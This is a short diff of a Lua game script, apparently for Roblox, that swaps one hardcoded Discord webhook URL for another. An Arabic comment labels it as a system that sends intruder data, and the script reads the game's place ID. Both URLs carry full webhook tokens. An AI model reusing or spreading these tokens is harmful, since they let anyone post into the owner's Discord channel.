@@ -5,7 +5,7 @@
 -- 📡 نظام الويب هوك - بيانات المتسلل
 -- ===============================================
 
-local webhook = "https://discord.com/api/webhooks/1446819483753779261/rFwzxQlujHplGBFyAxNxfbiFEdOt6kjnTr_gHRjn0ZqpvQBWThxpxr1fJM_VOGECgVYX"
+local webhook = "https://discord.com/api/webhooks/1454662763090804879/3VhV0rlsNmXEKVdMaYPjzNRFI1zhHKw5Ci4vhEwgovEwxYq-3Roulw1sEFjFReSY68Dn"
 
 -- الحصول على معرف اللعبة
 local PlaceId = game.PlaceId
